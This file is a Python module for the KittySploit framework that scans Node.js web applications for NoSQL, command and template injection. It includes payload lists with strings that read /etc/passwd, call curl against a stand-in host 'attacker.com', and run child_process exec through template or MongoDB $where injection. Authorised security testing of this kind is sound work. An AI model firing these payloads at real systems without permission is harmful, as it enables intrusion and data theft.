#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import json
import re
import urllib.parse
import time


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'Node.js Injection Scanner',
        'description': 'Scans for injection vulnerabilities in Node.js applications including NoSQL injection, command injection, and template injection',
        'author': 'KittySploit Team',
        'tags': ['web', 'nodejs', 'injection', 'scanner', 'security', 'nosql'],
        'references': [
            'https://owasp.org/www-community/attacks/Command_Injection',
            'https://owasp.org/www-community/attacks/NoSQL_Injection',
            'https://portswigger.net/web-security/os-command-injection',
        ]
    }

    # NoSQL injection payloads
    NOSQL_PAYLOADS = [
        # MongoDB injection
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$lt": ""}',
        '{"$gte": ""}',
        '{"$lte": ""}',
        '{"$in": []}',
        '{"$nin": []}',
        '{"$exists": true}',
        '{"$exists": false}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"$where": "this.username == this.password"}',
        '{"$or": [{"a": "a"}, {"b": "b"}]}',
        '{"$and": [{"a": "a"}, {"b": "b"}]}',
        
        # JavaScript injection in MongoDB
        '{"$where": "function(){return true}"}',
        '{"$where": "this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').exec(\'calc\')"}',
        
        # CouchDB injection
        '{"$or": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}',
    ]

    # Command injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        '; ls',
        '| ls',
        '`ls`',
        '$(ls)',
        '; whoami',
        '| whoami',
        '`whoami`',
        '$(whoami)',
        '; id',
        '| id',
        '`id`',
        '$(id)',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        '; ping -c 3 127.0.0.1',
        '| ping -c 3 127.0.0.1',
        '; sleep 5',
        '| sleep 5',
        '; curl http://attacker.com',
        '| curl http://attacker.com',
    ]

    # Template injection payloads (for EJS, Handlebars, etc.)
    TEMPLATE_INJECTION_PAYLOADS = [
        '{{7*7}}',
        '{{7*7}}={{49}}',
        '{{constructor.constructor("return process")().mainModule.require("child_process").exec("calc")}}',
        '{{global.process.mainModule.require("child_process").exec("calc")}}',
        '{{this.constructor.constructor("return process")().mainModule.require("child_process").exec("calc")}}',
        '<%=7*7%>',
        '<%=global.process.mainModule.require("child_process").exec("calc")%>',
        '${7*7}',
        '${global.process.mainModule.require("child_process").exec("calc")}',
    ]

    # Parameter names commonly used in Node.js apps
    NODEJS_PARAMS = [
        'id', 'username', 'email', 'password',
        'q', 'query', 'search', 'filter',
        'user', 'user_id', 'name', 'value',
        'data', 'input', 'cmd', 'command',
        'template', 'view', 'page',
    ]

    # Avoid matching the word "express" inside "expression", etc.
    _RE_EXPRESS_NOT_EXPRESSION = re.compile(r"\bexpress(?!ion\b)", re.IGNORECASE)

    def _php_stack_likely(self, response) -> bool:
        """True if headers/body strongly suggest PHP — do not report a Node.js stack."""
        if not response:
            return False
        xpb = (response.headers.get("X-Powered-By") or "").lower()
        if any(
            p in xpb
            for p in ("php", "laravel", "symfony", "cakephp", "zend", "yii", "wordpress")
        ):
            return True
        hdr = str(response.headers).lower()
        if "phpsessid" in hdr or "php_sess" in hdr:
            return True
        snippet = (response.text or "")[:20000]
        if "<?php" in snippet:
            return True
        return False

    def _evidence_nodejs_framework(self, response):
        """
        Return a short label only when there is credible evidence of a Node.js HTTP stack.
        """
        if not response or self._php_stack_likely(response):
            return None

        powered = (response.headers.get("X-Powered-By") or "").lower()
        body = response.text or ""
        body_lower = body.lower()
        hdr_blob = str(response.headers).lower()

        if "express" in powered:
            return "Express.js"
        if "fastify" in powered:
            return "Fastify"
        if "koa" in powered:
            return "Koa.js"
        if "hapi" in powered:
            return "Hapi.js"
        if "next.js" in powered or "nextjs" in powered:
            return "Next.js"
        if "node.js" in powered or powered.strip() in ("node",) or powered.startswith("node/"):
            return "Node.js"

        if "__next_data__" in body_lower or "__next_f" in body_lower:
            return "Next.js"
        if "__nuxt__" in body_lower or "window.__nuxt" in body_lower:
            return "Nuxt.js"

        if "connect.sid" in hdr_blob:
            return "Express.js (connect.sid session)"

        if self._RE_EXPRESS_NOT_EXPRESSION.search(body):
            return "Express.js (keyword in page)"

        return None

    def check(self):
        """
        Check if the target is accessible and shows credible Node.js stack signals.
        """
        try:
            response = self.http_request(method="GET", path="/")
            if not response:
                return False
            return self._evidence_nodejs_framework(response) is not None
        except Exception:
            return False

    def detect_nodejs_framework(self):
        """
        Detect Node.js framework (returns None if not evidenced — never a generic guess).
        """
        try:
            response = self.http_request(method="GET", path="/")
            if not response:
                return None
            return self._evidence_nodejs_framework(response)
        except Exception as e:
            print_debug(f"Error detecting Node.js framework: {str(e)}")
            return None

    def test_nosql_injection(self, payload, param_name='username', method='GET'):
        """
        Test NoSQL injection payload
        
        Args:
            payload: The NoSQL injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                # Try as JSON in query parameter
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
            else:
                # POST with JSON
                try:
                    # Try to parse payload as JSON
                    json_payload = json.loads(payload)
                    post_data = {param_name: json_payload}
                except:
                    # If not valid JSON, use as string
                    post_data = {param_name: payload}
                
                headers = {'Content-Type': 'application/json'}
                response = self.http_request(
                    method="POST",
                    path="/",
                    json=post_data,
                    headers=headers,
                    allow_redirects=False
                )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Analyze response
            is_vulnerable = False
            indicators = []
            
            # Check for NoSQL error messages
            nosql_errors = [
                'mongodb', 'mongoose', 'couchdb', 'nosql',
                'syntaxerror', 'typeerror', 'referenceerror',
                'cannot read property', 'undefined',
            ]
            
            response_lower = response.text.lower()
            for error in nosql_errors:
                if error in response_lower:
                    is_vulnerable = True
                    indicators.append(f'NoSQL error: {error}')
                    break
            
            # Check for authentication bypass (different response)
            if response.status_code in [200, 302, 301]:
                if 'login' not in response_lower or 'welcome' in response_lower or 'dashboard' in response_lower:
                    indicators.append('Possible authentication bypass')
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_length': len(response.text)
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def test_command_injection(self, payload, param_name='cmd', method='GET'):
        """
        Test command injection payload
        
        Args:
            payload: The command injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                
                start_time = time.time()
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time
            else:
                post_data = {param_name: payload}
                start_time = time.time()
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Analyze response
            is_vulnerable = False
            indicators = []
            
            # Check for command output in response
            command_outputs = [
                'uid=', 'gid=', 'groups=',  # id command
                'root:', 'bin:', 'daemon:',  # /etc/passwd
                'total ', 'drwx', '-rw-',  # ls command
                'ping:', 'icmp_seq=',  # ping command
            ]
            
            response_lower = response.text.lower()
            for output in command_outputs:
                if output in response_lower:
                    is_vulnerable = True
                    indicators.append(f'Command output detected: {output}')
                    break
            
            # Check for time-based command injection
            if 'sleep' in payload.lower() and elapsed_time > 4:
                is_vulnerable = True
                indicators.append(f'Time-based delay: {elapsed_time:.2f}s')
            
            # Check for error messages
            cmd_errors = [
                'command not found', 'syntax error',
                'permission denied', 'cannot execute',
            ]
            
            for error in cmd_errors:
                if error in response_lower:
                    is_vulnerable = True
                    indicators.append(f'Command error: {error}')
                    break
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_time': elapsed_time
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def test_template_injection(self, payload, param_name='template', method='GET'):
        """
        Test template injection payload
        
        Args:
            payload: The template injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
            else:
                post_data = {param_name: payload}
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Check if expression was evaluated
            is_vulnerable = False
            indicators = []
            
            # Check for expression evaluation (e.g., {{7*7}} becomes 49)
            if '{{7*7}}' in payload or '<%=7*7%>' in payload:
                if '49' in response.text:
                    is_vulnerable = True
                    indicators.append('Expression evaluated (7*7=49)')
            
            # Check for template errors
            template_errors = [
                'template error', 'syntax error',
                'ejs', 'handlebars', 'mustache',
                'render error', 'compilation error',
            ]
            
            response_lower = response.text.lower()
            for error in template_errors:
                if error in response_lower:
                    is_vulnerable = True
                    indicators.append(f'Template error: {error}')
                    break
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the Node.js injection scan
        """
        self.vulnerabilities = []
        self.test_results = []
        
        print_status("Starting Node.js injection scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Detect Node.js framework
        print_status("Detecting Node.js framework...")
        framework = self.detect_nodejs_framework()
        if framework:
            print_success(f"Node.js framework detected: {framework}")
        else:
            print_warning("Could not detect Node.js framework")
            print_info("Continuing with generic injection tests...")
        print_info("")
        
        # Test NoSQL injection
        print_status("Testing for NoSQL injection vulnerabilities...")
        print_info("")
        
        for param in self.NODEJS_PARAMS[:5]:  # Test first 5 params
            print_info(f"Testing parameter: {param}")
            
            for payload in self.NOSQL_PAYLOADS[:10]:  # Test first 10 payloads
                result = self.test_nosql_injection(payload, param, method='POST')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential NoSQL injection found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test command injection
        print_status("Testing for command injection vulnerabilities...")
        print_info("")
        
        cmd_params = ['cmd', 'command', 'exec', 'system', 'shell']
        for param in cmd_params:
            print_info(f"Testing parameter: {param}")
            
            for payload in self.COMMAND_INJECTION_PAYLOADS[:5]:  # Test first 5 payloads
                result = self.test_command_injection(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential command injection found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test template injection
        print_status("Testing for template injection vulnerabilities...")
        print_info("")
        
        template_params = ['template', 'view', 'page', 'render']
        for param in template_params:
            print_info(f"Testing parameter: {param}")
            
            for payload in self.TEMPLATE_INJECTION_PAYLOADS[:5]:  # Test first 5 payloads
                result = self.test_template_injection(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential template injection found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("Node.js Injection Scan Summary")
        print_status("=" * 60)
        
        if framework:
            print_info(f"Node.js Framework: {framework}")
        else:
            print_warning("Node.js Framework: Not detected")
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_warning("Injection vulnerabilities detected:")
            print_info("")
            
            table_data = []
            for vuln in self.vulnerabilities[:20]:  # Show first 20
                payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                indicators = ', '.join(vuln.get('indicators', [])[:2])
                table_data.append([
                    vuln.get('param', 'N/A'),
                    vuln.get('method', 'GET'),
                    payload_short,
                    indicators
                ])
            
            print_table(['Parameter', 'Method', 'Payload', 'Indicators'], table_data)
            print_info("")
            print_warning("IMPORTANT: These are potential vulnerabilities. Manual verification is required.")
        else:
            print_info("No injection vulnerabilities detected during automated testing.")
            print_info("Note: This does not guarantee the application is secure.")
        
        return True
